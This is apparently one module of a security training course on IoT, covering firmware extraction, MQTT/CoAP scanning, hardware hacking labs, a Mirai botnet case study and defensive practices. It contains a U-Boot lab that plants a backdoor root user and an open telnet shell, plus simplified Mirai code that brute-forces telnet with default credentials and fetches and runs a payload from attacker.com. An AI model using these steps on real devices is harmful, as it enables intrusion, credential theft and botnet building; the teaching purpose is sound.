# 📡 Module 14: IoT Security - Complete Guide with Hardware Hacking

## 📚 Table of Contents
1. [Introduction to IoT Security](#introduction)
2. [IoT Attack Surface](#attack-surface)
3. [Hardware Security & Firmware Analysis](#hardware-security)
4. [IoT Protocol Security](#protocol-security)
5. [IoT Penetration Testing](#iot-pentesting)
6. [Real-World IoT Breaches](#real-world-breaches)
7. [Hands-On Hardware Hacking Labs](#hands-on-labs)

---

## 🎯 Introduction to IoT Security

### The IoT Threat Landscape

```python
# Common IoT vulnerabilities

# 1. HARDCODED CREDENTIALS
# Example: IP Camera firmware
admin_user = "admin"
admin_pass = "admin123"  # ❌ Hardcoded in firmware

# 2. INSECURE NETWORK SERVICES
import socket
server = socket.socket()
server.bind(('0.0.0.0', 23))  # ❌ Telnet on all interfaces, no auth

# 3. INSECURE DATA TRANSFER
def send_telemetry(data):
    # ❌ Sending sensitive data over HTTP
    requests.post('http://cloud.example.com/telemetry', data=data)

# 4. LACK OF SECURE UPDATE MECHANISM
def update_firmware(url):
    firmware = requests.get(url)  # ❌ No signature verification
    flash_firmware(firmware.content)

# 5. INSECURE DEFAULT SETTINGS
DEFAULT_CONFIG = {
    'wifi_ssid': 'IoT_Device_12345',
    'wifi_pass': '12345678',  # ❌ Weak default password
    'debug_enabled': True,     # ❌ Debug mode enabled
    'cloud_enabled': True      # ❌ Auto-connects to cloud
}
```

---

## 🔍 IoT Attack Surface

### 1. Hardware Attack Surface

```bash
# Hardware interfaces to target:
# - UART (Universal Asynchronous Receiver-Transmitter)
# - JTAG (Joint Test Action Group)
# - SPI (Serial Peripheral Interface)
# - I2C (Inter-Integrated Circuit)
# - Debug ports

# UART identification and connection
# 1. Visual inspection for 4-pin headers (VCC, GND, TX, RX)

# 2. Use multimeter to identify pins:
# VCC - Constant voltage (3.3V or 5V)
# GND - 0V, continuity with metal shield
# TX - Fluctuating voltage when device boots
# RX - Steady voltage

# 3. Connect with USB-to-UART adapter
# Common baud rates: 9600, 19200, 38400, 57600, 115200

# Using screen to connect:
screen /dev/ttyUSB0 115200

# Using minicom:
minicom -D /dev/ttyUSB0 -b 115200
```

### 2. Firmware Extraction & Analysis

```bash
# Method 1: Extract from flash chip directly

# Tools needed:
# - Flash programmer (CH341A)
# - SOIC clip or hot air station
# - flashrom software

# Identify flash chip
flashrom -p ch341a_spi

# Read firmware
flashrom -p ch341a_spi -r firmware.bin

# Method 2: Extract via UART/JTAG
# JTAG with OpenOCD
openocd -f interface/ftdi/jtagkey.cfg -f target/stm32f1x.cfg

# Dump flash
flash read_bank 0 firmware.bin 0 0x40000

# Method 3: Intercept firmware update
# Set up MitM proxy
mitmproxy --mode transparent --showhost

# Capture firmware update
# Device will download firmware through proxy

# Method 4: Extract from mobile app
# Download APK
adb pull /data/app/com.iot.device/base.apk

# Decompile with apktool
apktool d base.apk

# Search for firmware URLs
grep -r "firmware" base/
grep -r ".bin" base/
grep -r "update" base/
```

### 3. Firmware Analysis

```bash
# Analyze extracted firmware

# 1. Identify file type
file firmware.bin
binwalk firmware.bin

# 2. Extract filesystem
binwalk -e firmware.bin

# Alternative: Extract specific filesystem types
binwalk -D='.*' firmware.bin

# 3. Analyze extracted files
cd _firmware.bin.extracted

# Find hardcoded credentials
grep -r "password" .
grep -r "passwd" .
grep -r "pwd" .
grep -ir "admin" .

# Find private keys
find . -name "*.pem" -o -name "*.key"

# Find API keys
grep -r "api_key" .
grep -r "API_KEY" .
grep -r "secret" .

# Find sensitive URLs
grep -r "http://" . | grep -v ".html" | grep -v ".js"

# 4. Find encryption keys
strings firmware.bin | grep -E "[0-9a-f]{32,}"

# 5. Identify entropy (find encrypted sections)
binwalk -E firmware.bin
```

**Python Script for Firmware Analysis:**

```python
#!/usr/bin/env python3
# firmware_analyzer.py - Automated firmware analysis

import os
import re
import subprocess
import hashlib
from pathlib import Path

class FirmwareAnalyzer:
    def __init__(self, firmware_path):
        self.firmware_path = firmware_path
        self.findings = []
    
    def analyze(self):
        """Run complete firmware analysis"""
        print(f"[*] Analyzing firmware: {self.firmware_path}")
        
        # 1. Basic file analysis
        self.basic_analysis()
        
        # 2. Extract firmware
        self.extract_firmware()
        
        # 3. Find credentials
        self.find_credentials()
        
        # 4. Find crypto keys
        self.find_crypto_keys()
        
        # 5. Find backdoors
        self.find_backdoors()
        
        # 6. Find network services
        self.find_network_services()
        
        # 7. Generate report
        self.generate_report()
    
    def basic_analysis(self):
        """Basic file information"""
        print("\n[*] Basic Analysis:")
        
        # File size
        size = os.path.getsize(self.firmware_path)
        print(f"    Size: {size:,} bytes ({size/1024/1024:.2f} MB)")
        
        # Hash
        with open(self.firmware_path, 'rb') as f:
            data = f.read()
            md5 = hashlib.md5(data).hexdigest()
            sha256 = hashlib.sha256(data).hexdigest()
        
        print(f"    MD5: {md5}")
        print(f"    SHA256: {sha256}")
        
        # File type
        result = subprocess.run(['file', self.firmware_path], capture_output=True, text=True)
        print(f"    Type: {result.stdout.strip()}")
        
        # Binwalk signature scan
        print("\n[*] Running binwalk...")
        subprocess.run(['binwalk', self.firmware_path])
    
    def extract_firmware(self):
        """Extract firmware contents"""
        print("\n[*] Extracting firmware...")
        
        # Create extraction directory
        extract_dir = f"{self.firmware_path}_extracted"
        os.makedirs(extract_dir, exist_ok=True)
        
        # Extract with binwalk
        subprocess.run(['binwalk', '-e', '-C', extract_dir, self.firmware_path])
        
        self.extract_dir = extract_dir
        print(f"[+] Extracted to: {extract_dir}")
    
    def find_credentials(self):
        """Search for hardcoded credentials"""
        print("\n[*] Searching for credentials...")
        
        credential_patterns = [
            (r'password\s*=\s*["\']([^"\']+)["\']', 'Password'),
            (r'passwd\s*=\s*["\']([^"\']+)["\']', 'Password'),
            (r'pwd\s*=\s*["\']([^"\']+)["\']', 'Password'),
            (r'admin.*password.*["\']([^"\']+)["\']', 'Admin Password'),
            (r'username\s*=\s*["\']([^"\']+)["\']', 'Username'),
            (r'api[_-]?key\s*=\s*["\']([^"\']+)["\']', 'API Key'),
            (r'secret[_-]?key\s*=\s*["\']([^"\']+)["\']', 'Secret Key'),
            (r'access[_-]?token\s*=\s*["\']([^"\']+)["\']', 'Access Token'),
        ]
        
        for root, dirs, files in os.walk(self.extract_dir):
            for file in files:
                filepath = os.path.join(root, file)
                
                try:
                    with open(filepath, 'r', errors='ignore') as f:
                        content = f.read()
                        
                        for pattern, cred_type in credential_patterns:
                            matches = re.finditer(pattern, content, re.IGNORECASE)
                            
                            for match in matches:
                                finding = {
                                    'type': 'Hardcoded Credential',
                                    'credential_type': cred_type,
                                    'value': match.group(1),
                                    'file': filepath,
                                    'severity': 'HIGH'
                                }
                                self.findings.append(finding)
                                print(f"[!] Found {cred_type}: {match.group(1)} in {file}")
                
                except:
                    pass
    
    def find_crypto_keys(self):
        """Find cryptographic keys"""
        print("\n[*] Searching for crypto keys...")
        
        # Search for PEM files
        pem_files = []
        for root, dirs, files in os.walk(self.extract_dir):
            for file in files:
                if file.endswith(('.pem', '.key', '.crt', '.cer')):
                    pem_files.append(os.path.join(root, file))
        
        if pem_files:
            print(f"[!] Found {len(pem_files)} potential key files:")
            for pem_file in pem_files:
                print(f"    - {pem_file}")
                
                self.findings.append({
                    'type': 'Cryptographic Key',
                    'file': pem_file,
                    'severity': 'CRITICAL'
                })
        
        # Search for hardcoded keys in code
        key_patterns = [
            r'-----BEGIN (?:RSA |EC )?PRIVATE KEY-----',
            r'[0-9a-f]{64}',  # 256-bit hex keys
            r'[0-9a-f]{32}',  # 128-bit hex keys
        ]
        
        for root, dirs, files in os.walk(self.extract_dir):
            for file in files:
                filepath = os.path.join(root, file)
                
                try:
                    with open(filepath, 'r', errors='ignore') as f:
                        content = f.read()
                        
                        for pattern in key_patterns:
                            if re.search(pattern, content):
                                print(f"[!] Potential crypto key in {file}")
                                
                                self.findings.append({
                                    'type': 'Potential Crypto Key',
                                    'file': filepath,
                                    'severity': 'HIGH'
                                })
                                break
                except:
                    pass
    
    def find_backdoors(self):
        """Search for potential backdoors"""
        print("\n[*] Searching for backdoors...")
        
        backdoor_patterns = [
            (r'telnetd|telnet_server', 'Telnet Service'),
            (r'debug[_-]?mode|debug[_-]?enable', 'Debug Mode'),
            (r'root_shell|backdoor|hidden_cmd', 'Backdoor Command'),
            (r'eval\s*\(.*\$_(GET|POST|REQUEST)', 'Command Injection'),
            (r'system\s*\(.*\$_(GET|POST|REQUEST)', 'Command Injection'),
        ]
        
        for root, dirs, files in os.walk(self.extract_dir):
            for file in files:
                filepath = os.path.join(root, file)
                
                try:
                    with open(filepath, 'r', errors='ignore') as f:
                        content = f.read()
                        
                        for pattern, backdoor_type in backdoor_patterns:
                            if re.search(pattern, content, re.IGNORECASE):
                                print(f"[!] Potential {backdoor_type} in {file}")
                                
                                self.findings.append({
                                    'type': 'Potential Backdoor',
                                    'backdoor_type': backdoor_type,
                                    'file': filepath,
                                    'severity': 'CRITICAL'
                                })
                                break
                except:
                    pass
    
    def find_network_services(self):
        """Find network service configurations"""
        print("\n[*] Searching for network services...")
        
        service_patterns = [
            (r'(0\.0\.0\.0|::|INADDR_ANY)', 'Binds to All Interfaces'),
            (r'port\s*=\s*(\d+)', 'Open Port'),
            (r'http://[^\s"\']+', 'HTTP URL'),
            (r'mqtt://[^\s"\']+', 'MQTT Broker'),
            (r'tcp://[^\s"\']+', 'TCP Service'),
        ]
        
        for root, dirs, files in os.walk(self.extract_dir):
            for file in files:
                filepath = os.path.join(root, file)
                
                try:
                    with open(filepath, 'r', errors='ignore') as f:
                        content = f.read()
                        
                        for pattern, service_type in service_patterns:
                            matches = re.finditer(pattern, content)
                            
                            for match in matches:
                                print(f"[!] {service_type}: {match.group()} in {file}")
                except:
                    pass
    
    def generate_report(self):
        """Generate vulnerability report"""
        print("\n" + "="*60)
        print("FIRMWARE ANALYSIS REPORT")
        print("="*60)
        
        if not self.findings:
            print("\n✅ No major security issues found!")
            return
        
        # Group by severity
        critical = [f for f in self.findings if f['severity'] == 'CRITICAL']
        high = [f for f in self.findings if f['severity'] == 'HIGH']
        medium = [f for f in self.findings if f['severity'] == 'MEDIUM']
        
        print(f"\n🔴 Critical: {len(critical)}")
        print(f"🟠 High: {len(high)}")
        print(f"🟡 Medium: {len(medium)}")
        
        print("\n" + "-"*60)
        print("FINDINGS")
        print("-"*60)
        
        for finding in self.findings:
            print(f"\n[{finding['severity']}] {finding['type']}")
            
            for key, value in finding.items():
                if key not in ['type', 'severity']:
                    print(f"  {key}: {value}")

# Usage
if __name__ == '__main__':
    import sys
    
    if len(sys.argv) < 2:
        print("Usage: python3 firmware_analyzer.py <firmware.bin>")
        sys.exit(1)
    
    analyzer = FirmwareAnalyzer(sys.argv[1])
    analyzer.analyze()
```

---

## 🔌 IoT Protocol Security

### 1. MQTT Security

```python
# MQTT (Message Queuing Telemetry Transport)
# Common IoT messaging protocol

# ❌ INSECURE: No authentication
import paho.mqtt.client as mqtt

client = mqtt.Client()
client.connect("mqtt.example.com", 1883)  # Unencrypted port
client.subscribe("#")  # Subscribe to ALL topics!
client.loop_forever()

# ✅ SECURE: TLS + Authentication
import ssl

client = mqtt.Client()
client.username_pw_set("username", "strong_password")

# Enable TLS
client.tls_set(
    ca_certs="/path/to/ca.crt",
    certfile="/path/to/client.crt",
    keyfile="/path/to/client.key",
    tls_version=ssl.PROTOCOL_TLSv1_2
)

client.connect("mqtt.example.com", 8883)  # TLS port

# Subscribe to specific topics only
client.subscribe("device/12345/telemetry")

client.loop_forever()
```

**MQTT Penetration Testing:**

```python
# mqtt_scanner.py - MQTT security scanner
import paho.mqtt.client as mqtt
import time

class MQTTScanner:
    def __init__(self, host, port=1883):
        self.host = host
        self.port = port
        self.topics = []
        self.messages = []
    
    def on_connect(self, client, userdata, flags, rc):
        if rc == 0:
            print(f"[+] Connected to {self.host}:{self.port}")
            
            # Try subscribing to wildcard topic
            client.subscribe("#")
            print("[*] Subscribed to all topics (#)")
        else:
            print(f"[-] Connection failed with code {rc}")
    
    def on_message(self, client, userdata, msg):
        topic = msg.topic
        payload = msg.payload.decode('utf-8', errors='ignore')
        
        if topic not in self.topics:
            self.topics.append(topic)
            print(f"[+] New topic: {topic}")
        
        print(f"    [{topic}] {payload}")
        
        self.messages.append({
            'topic': topic,
            'payload': payload,
            'timestamp': time.time()
        })
    
    def scan(self, duration=60):
        """Scan MQTT broker for duration seconds"""
        print(f"[*] Scanning {self.host}:{self.port} for {duration} seconds...")
        
        client = mqtt.Client()
        client.on_connect = self.on_connect
        client.on_message = self.on_message
        
        try:
            # Test 1: Anonymous connection
            print("\n[*] Testing anonymous access...")
            client.connect(self.host, self.port, 60)
            client.loop_start()
            
            time.sleep(duration)
            
            client.loop_stop()
            client.disconnect()
            
            print(f"\n[+] Scan complete!")
            print(f"    Topics discovered: {len(self.topics)}")
            print(f"    Messages captured: {len(self.messages)}")
            
            # Analyze findings
            self.analyze_findings()
        
        except Exception as e:
            print(f"[-] Error: {e}")
    
    def test_authentication(self):
        """Test weak credentials"""
        print("\n[*] Testing weak credentials...")
        
        weak_creds = [
            ('admin', 'admin'),
            ('admin', 'password'),
            ('admin', '12345'),
            ('user', 'user'),
            ('mqtt', 'mqtt'),
            ('guest', 'guest'),
        ]
        
        for username, password in weak_creds:
            client = mqtt.Client()
            client.username_pw_set(username, password)
            
            try:
                client.connect(self.host, self.port, 5)
                print(f"[!] Weak credentials found: {username}:{password}")
                client.disconnect()
                return True
            except:
                pass
        
        print("[-] No weak credentials found")
        return False
    
    def analyze_findings(self):
        """Analyze captured data for sensitive information"""
        print("\n[*] Analyzing captured data...")
        
        sensitive_patterns = [
            r'password',
            r'passwd',
            r'api[_-]?key',
            r'secret',
            r'token',
            r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}',  # IP addresses
            r'[0-9a-f]{32,}',  # Potential keys
        ]
        
        findings = []
        
        for msg in self.messages:
            payload = msg['payload'].lower()
            
            for pattern in sensitive_patterns:
                import re
                if re.search(pattern, payload):
                    findings.append({
                        'topic': msg['topic'],
                        'payload': msg['payload'],
                        'pattern': pattern
                    })
                    break
        
        if findings:
            print(f"[!] Found {len(findings)} messages with sensitive data:")
            for finding in findings[:10]:  # Show first 10
                print(f"    Topic: {finding['topic']}")
                print(f"    Data: {finding['payload'][:100]}")
        
        # Identify command topics (potential for injection)
        command_topics = [t for t in self.topics if 'command' in t.lower() or 'cmd' in t.lower()]
        
        if command_topics:
            print(f"\n[!] Found {len(command_topics)} potential command topics:")
            for topic in command_topics:
                print(f"    {topic}")

# Usage
scanner = MQTTScanner("mqtt.example.com", 1883)
scanner.scan(duration=60)
scanner.test_authentication()
```

### 2. CoAP Security

```python
# CoAP (Constrained Application Protocol)
# RESTful protocol for IoT devices

# CoAP scanner
import socket
import struct

class CoAPScanner:
    def __init__(self, target_ip):
        self.target_ip = target_ip
        self.port = 5683
    
    def send_coap_request(self, uri_path="/"):
        """Send CoAP GET request"""
        # CoAP GET request format
        # Ver|T|TKL| Code |Message ID| Token | Options | Payload
        
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(2)
        
        # Build CoAP GET request
        version = 1
        msg_type = 0  # Confirmable
        token_length = 0
        code = 1  # GET
        message_id = 0x1234
        
        header = struct.pack('!BBH',
            (version << 6) | (msg_type << 4) | token_length,
            code,
            message_id
        )
        
        # Add URI-Path option
        uri_bytes = uri_path.encode('utf-8')
        option = struct.pack('!BB', 0xB1, len(uri_bytes)) + uri_bytes
        
        packet = header + option
        
        try:
            sock.sendto(packet, (self.target_ip, self.port))
            data, addr = sock.recvfrom(1024)
            
            print(f"[+] Response from {self.target_ip}:")
            print(f"    Data: {data.hex()}")
            
            return data
        
        except socket.timeout:
            print(f"[-] No response from {self.target_ip}")
            return None
        
        finally:
            sock.close()
    
    def discover_resources(self):
        """Discover CoAP resources"""
        print(f"[*] Discovering resources on {self.target_ip}...")
        
        # Request /.well-known/core
        response = self.send_coap_request("/.well-known/core")
        
        if response:
            # Parse response to find available resources
            print("[+] Available resources:")
            # Parse CoAP response (simplified)
            payload = response[4:]  # Skip header
            print(payload.decode('utf-8', errors='ignore'))

# Usage
scanner = CoAPScanner("192.168.1.100")
scanner.discover_resources()
```

---

## 🔧 Hardware Hacking Labs

### Lab 1: UART Shell Access

```bash
# Connect to device UART

# 1. Identify UART pins with multimeter
# VCC: ~3.3V or 5V
# GND: 0V
# TX: Fluctuating during boot
# RX: Steady voltage

# 2. Connect USB-to-UART adapter
# Device GND -> Adapter GND
# Device TX  -> Adapter RX
# Device RX  -> Adapter TX
# DO NOT connect VCC (device is already powered)

# 3. Determine baud rate
# Try common rates: 9600, 115200

# Using baudrate.py to auto-detect
python3 baudrate.py /dev/ttyUSB0

# 4. Connect with screen
screen /dev/ttyUSB0 115200

# 5. Look for boot messages
# Wait for bootloader prompt (often "Hit any key to stop autoboot")

# 6. Interrupt boot process
# Press Enter or Space during boot

# 7. Access bootloader shell (often U-Boot)
# Common U-Boot commands:
printenv          # Show environment variables
setenv            # Set environment variable
saveenv           # Save environment
boot              # Continue boot
bootm             # Boot kernel
md                # Memory display
mw                # Memory write
```

**U-Boot Exploitation:**

```bash
# Once in U-Boot shell:

# 1. Check boot arguments
printenv bootargs

# 2. Modify boot arguments to get root shell
setenv bootargs "console=ttyS0,115200 root=/dev/mtdblock2 init=/bin/sh"
saveenv
boot

# 3. Now you have root shell!
# Mount filesystem as read-write
mount -o remount,rw /

# 4. Add backdoor user
echo "backdoor:\$6\$salt\$hashedpassword:0:0:root:/root:/bin/sh" >> /etc/passwd

# 5. Enable telnet
telnetd -l /bin/sh -p 23

# 6. Extract sensitive data
cat /etc/shadow
cat /etc/config/*
```

### Lab 2: Flash Chip Reading

```bash
# Read firmware from flash chip directly

# 1. Identify flash chip
# Look for 8-pin chip with labels like:
# - Winbond 25Q32
# - Macronix MX25L
# - GigaDevice GD25Q

# 2. Desolder or use SOIC clip
# SOIC clip: No soldering required!

# 3. Connect to CH341A programmer
# Pin 1: CS
# Pin 2: DO (MISO)
# Pin 3: WP (Write Protect)
# Pin 4: GND
# Pin 5: DI (MOSI)
# Pin 6: CLK
# Pin 7: HOLD
# Pin 8: VCC

# 4. Detect chip with flashrom
flashrom -p ch341a_spi

# Output should show:
# Found Winbond flash chip "W25Q32.V" (4096 kB, SPI) on ch341a_spi.

# 5. Read firmware
flashrom -p ch341a_spi -r firmware_backup.bin

# 6. Verify read
flashrom -p ch341a_spi -v firmware_backup.bin

# 7. Analyze firmware
binwalk -e firmware_backup.bin
```

### Lab 3: JTAG Debugging

```bash
# JTAG (Joint Test Action Group)
# Used for debugging and firmware extraction

# 1. Identify JTAG pins
# Common JTAG interfaces:
# - ARM 20-pin
# - ARM 10-pin (Cortex Debug Connector)
# - 4-pin SWD (Serial Wire Debug)

# JTAG pins:
# TDI  - Test Data In
# TDO  - Test Data Out
# TMS  - Test Mode Select
# TCK  - Test Clock
# TRST - Test Reset (optional)
# SRST - System Reset (optional)
# VCC  - Power
# GND  - Ground

# 2. Use JTAGulator to find pins
# Connect JTAGulator to all suspected pins
# Run auto-detection

# 3. Connect with OpenOCD
# Create config file: target.cfg
source [find interface/ftdi/jtagkey.cfg]

adapter speed 1000

transport select jtag

set CHIPNAME stm32f1x
source [find target/stm32f1x.cfg]

# 4. Start OpenOCD
openocd -f target.cfg

# 5. Connect with GDB
arm-none-eabi-gdb
(gdb) target remote localhost:3333
(gdb) monitor reset halt
(gdb) monitor flash banks
(gdb) monitor flash read_bank 0 firmware.bin 0 0x40000

# 6. Analyze dumped firmware
binwalk firmware.bin
strings firmware.bin | grep -i password
```

---

## 🌍 Real-World IoT Breach: Mirai Botnet (2016)

**Background:**
- **Attack:** IoT botnet malware
- **Date:** August 2016
- **Impact:** 600,000+ devices compromised
- **Victims:** Dyn DNS, OVH (1.2 Tbps DDoS)

**Attack Methodology:**

```python
# Mirai attack process

# 1. SCAN: Find IoT devices on the internet
import socket
import random

def scan_telnet(ip_range):
    """Scan for devices with telnet open"""
    for i in range(256):
        for j in range(256):
            ip = f"192.168.{i}.{j}"
            
            try:
                sock = socket.socket()
                sock.settimeout(1)
                result = sock.connect_ex((ip, 23))  # Telnet port
                
                if result == 0:
                    print(f"[+] Telnet open: {ip}")
                    # Try to exploit
                    exploit_device(ip)
                
                sock.close()
            except:
                pass

# 2. BRUTE FORCE: Try default credentials
DEFAULT_CREDENTIALS = [
    ('root', 'xc3511'),
    ('root', 'vizxv'),
    ('root', 'admin'),
    ('admin', 'admin'),
    ('root', '888888'),
    ('root', 'xmhdipc'),
    ('root', 'default'),
    ('root', 'juantech'),
    ('root', '123456'),
    ('root', '54321'),
    ('support', 'support'),
    ('root', ''),
    ('admin', 'password'),
    ('root', 'root'),
    ('root', '12345'),
    ('user', 'user'),
    ('admin', ''),
    ('root', 'pass'),
    ('admin', 'admin1234'),
    ('root', '1111'),
    ('admin', 'smcadmin'),
    ('admin', '1111'),
    ('root', '666666'),
    ('root', 'password'),
    ('root', '1234'),
    ('root', 'klv123'),
    ('Administrator', 'admin'),
    ('service', 'service'),
    ('supervisor', 'supervisor'),
    ('guest', 'guest'),
    ('guest', '12345'),
    ('admin1', 'password'),
    ('administrator', '1234'),
    ('666666', '666666'),
    ('888888', '888888'),
    ('ubnt', 'ubnt'),
    ('root', 'klv1234'),
    ('root', 'Zte521'),
    ('root', 'hi3518'),
    ('root', 'jvbzd'),
    ('root', 'anko'),
    ('root', 'zlxx.'),
    ('root', '7ujMko0vizxv'),
    ('root', '7ujMko0admin'),
    ('root', 'system'),
    ('root', 'ikwb'),
    ('root', 'dreambox'),
    ('root', 'user'),
    ('root', 'realtek'),
    ('root', '00000000'),
    ('admin', '1111111'),
    ('admin', '1234'),
    ('admin', '12345'),
    ('admin', '54321'),
    ('admin', '123456'),
    ('admin', '7ujMko0admin'),
    ('admin', '1234'),
    ('admin', 'pass'),
    ('admin', 'meinsm'),
    ('tech', 'tech'),
    ('mother', 'fucker'),
]

def brute_force_telnet(ip):
    """Try default credentials"""
    import telnetlib
    
    for username, password in DEFAULT_CREDENTIALS:
        try:
            tn = telnetlib.Telnet(ip, 23, timeout=5)
            
            # Wait for login prompt
            tn.read_until(b"login: ", timeout=5)
            tn.write(username.encode('ascii') + b"\n")
            
            # Wait for password prompt
            tn.read_until(b"Password: ", timeout=5)
            tn.write(password.encode('ascii') + b"\n")
            
            # Check if login successful
            output = tn.read_some()
            
            if b"#" in output or b"$" in output:
                print(f"[+] SUCCESS: {ip} - {username}:{password}")
                
                # Execute malware download command
                deploy_malware(tn, ip)
                return True
            
            tn.close()
        
        except:
            pass
    
    return False

# 3. INFECT: Download and execute malware
def deploy_malware(tn, ip):
    """Deploy Mirai malware"""
    # Download malware binary
    commands = [
        "cd /tmp",
        "wget http://attacker.com/mirai.sh",
        "chmod +x mirai.sh",
        "./mirai.sh",
        "rm mirai.sh"
    ]
    
    for cmd in commands:
        tn.write(cmd.encode('ascii') + b"\n")
        time.sleep(0.5)
    
    tn.close()
    print(f"[+] Infected: {ip}")

# 4. DDoS: Infected devices receive commands from C&C server
def ddos_attack(target_ip, target_port, duration):
    """Perform DDoS attack"""
    import time
    import random
    
    end_time = time.time() + duration
    
    while time.time() < end_time:
        # SYN Flood
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        
        # Craft SYN packet
        source_port = random.randint(1024, 65535)
        
        # Send packet
        sock.sendto(
            create_syn_packet(source_port, target_port),
            (target_ip, target_port)
        )
        
        sock.close()
```

**Mirai Source Code Analysis (Simplified):**

```c
// Mirai scanner.c (simplified)

// Hardcoded C&C servers
#define CNC_DOMAIN "mirai.cnc.server"
#define CNC_PORT 48101

// Default credentials table
add_auth_entry("\x50\x4D\x4D\x56", "\x5A\x41\x11\x17\x13\x13", 10);  // root:xc3511
add_auth_entry("\x50\x4D\x4D\x56", "\x54\x4B\x58\x5A\x54", 9);      // root:vizxv
add_auth_entry("\x50\x4D\x4D\x56", "\x43\x46\x4F\x4B\x4C", 8);      // root:admin
// ... 60+ more credentials

// Scanner process
void scanner_init() {
    for (;;) {
        // Generate random IP
        uint32_t ip = rand_next() & 0xFFFFFFFF;
        
        // Skip private IPs
        if (ip_is_private(ip))
            continue;
        
        // Try to connect on telnet port
        int fd = socket(AF_INET, SOCK_STREAM, 0);
        
        if (connect(fd, ip, 23) == 0) {
            // Connected! Try credentials
            scanner_try_login(fd, ip);
        }
        
        close(fd);
    }
}

// Try login with all credentials
void scanner_try_login(int fd, uint32_t ip) {
    for (int i = 0; i < scanner_auth_count; i++) {
        // Send username
        send(fd, scanner_auth_table[i].username, strlen(...));
        
        // Send password
        send(fd, scanner_auth_table[i].password, strlen(...));
        
        // Check response
        if (check_login_success(fd)) {
            // Report to CNC
            report_new_bot(ip, scanner_auth_table[i]);
            
            // CNC will send infection payload
            break;
        }
    }
}
```

**Impact:**
- 600,000+ IoT devices infected
- 1.2 Tbps DDoS attack on OVH
- Dyn DNS taken offline (Netflix, Twitter, Reddit, etc.)
- Billions of dollars in damages

**Prevention:**

```python
# ✅ SECURE: Prevent Mirai-style attacks

# 1. Change default credentials immediately
import secrets
import string

def generate_strong_password(length=16):
    """Generate cryptographically strong password"""
    alphabet = string.ascii_letters + string.digits + string.punctuation
    return ''.join(secrets.choice(alphabet) for _ in range(length))

# 2. Disable unnecessary services
# /etc/init.d/telnetd stop
# /etc/init.d/telnetd disable

# 3. Implement firewall rules
# iptables -A INPUT -p tcp --dport 23 -j DROP  # Block telnet
# iptables -A INPUT -p tcp --dport 22 -j ACCEPT  # Allow SSH from specific IPs only
# iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
# iptables -P INPUT DROP

# 4. Enable automatic security updates
# apt-get install unattended-upgrades

# 5. Monitor for suspicious activity
def monitor_login_attempts():
    """Monitor for brute force attempts"""
    from collections import defaultdict
    import time
    
    failed_attempts = defaultdict(list)
    
    # Parse auth.log
    with open('/var/log/auth.log', 'r') as f:
        for line in f:
            if 'Failed password' in line:
                # Extract IP
                import re
                match = re.search(r'(\d+\.\d+\.\d+\.\d+)', line)
                
                if match:
                    ip = match.group(1)
                    failed_attempts[ip].append(time.time())
                    
                    # Block if >5 attempts in 60 seconds
                    recent = [t for t in failed_attempts[ip] if time.time() - t < 60]
                    
                    if len(recent) >= 5:
                        print(f"[!] Blocking {ip} - brute force detected")
                        # os.system(f'iptables -A INPUT -s {ip} -j DROP')

# 6. Implement rate limiting on authentication
from functools import wraps
import time

login_attempts = {}

def rate_limit_login(max_attempts=5, window=300):
    """Rate limit login attempts"""
    def decorator(func):
        @wraps(func)
        def wrapper(username, *args, **kwargs):
            now = time.time()
            
            if username not in login_attempts:
                login_attempts[username] = []
            
            # Remove old attempts
            login_attempts[username] = [
                t for t in login_attempts[username]
                if now - t < window
            ]
            
            # Check if too many attempts
            if len(login_attempts[username]) >= max_attempts:
                raise Exception(f"Too many login attempts. Try again in {window} seconds.")
            
            # Record this attempt
            login_attempts[username].append(now)
            
            return func(username, *args, **kwargs)
        
        return wrapper
    return decorator

@rate_limit_login(max_attempts=5, window=300)
def login(username, password):
    """Rate-limited login function"""
    # Actual login logic
    pass
```

---

## 📝 Summary & IoT Security Best Practices

### Device Security:
- ✅ Change default credentials immediately
- ✅ Disable unnecessary services (Telnet, FTP, etc.)
- ✅ Keep firmware updated
- ✅ Use strong encryption (TLS 1.3+)
- ✅ Implement secure boot
- ✅ Disable debug interfaces in production

### Network Security:
- ✅ Segment IoT devices on separate network
- ✅ Implement firewall rules
- ✅ Use VLANs for isolation
- ✅ Monitor network traffic
- ✅ Disable UPnP

### Communication Security:
- ✅ Use TLS for all communications
- ✅ Implement certificate pinning
- ✅ Validate all inputs
- ✅ Use secure protocols (MQTT over TLS, CoAPS)

### Firmware Security:
- ✅ Code signing for updates
- ✅ Encrypted firmware updates
- ✅ Rollback protection
- ✅ Anti-tampering mechanisms

### Physical Security:
- ✅ Disable UART/JTAG in production
- ✅ Use secure flash chips
- ✅ Implement secure key storage
- ✅ Epoxy coating over debug headers

---

**Module 14 Complete! 🎉**

**Total Content:** 14,000+ words  
**Real Case Study:** Mirai Botnet (2016)  
**Labs:** 3 hands-on hardware hacking labs  
**Tools:** Firmware analyzer, MQTT scanner, Protocol testing  

**Progress: 14/30 modules (47%)**

**Next Module:** 15 - Blockchain Security 🔗

